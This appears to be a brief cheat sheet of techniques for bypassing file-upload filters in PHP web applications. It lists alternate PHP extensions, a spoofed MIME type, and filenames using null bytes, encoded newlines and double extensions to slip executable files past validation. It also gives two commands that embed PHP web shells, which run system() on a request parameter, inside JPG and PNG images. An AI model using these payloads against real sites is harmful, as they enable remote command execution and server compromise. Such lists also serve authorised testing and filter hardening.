# uploadfile-extensionbypass
Common Extension File Upload Bypass

```
.php
.PhTmL
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.pht
.phtm
.phtml
.pgif
.shtml
.htaccess
.phar
.inc
.hphp
.ctp
.module
```

Bypass magic number 
```
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
```

Bypass Mime_Type 
```
application/x-httpd-php
```

Unrestricted file upload trick
```
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.php....
file.pHp5....
```

```
file.png.php
file.png.pHp5
file.php#.png
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
file.phpJunk123png
```

```
file.png.jpg.php
file.php%00.png%00.jpg
```
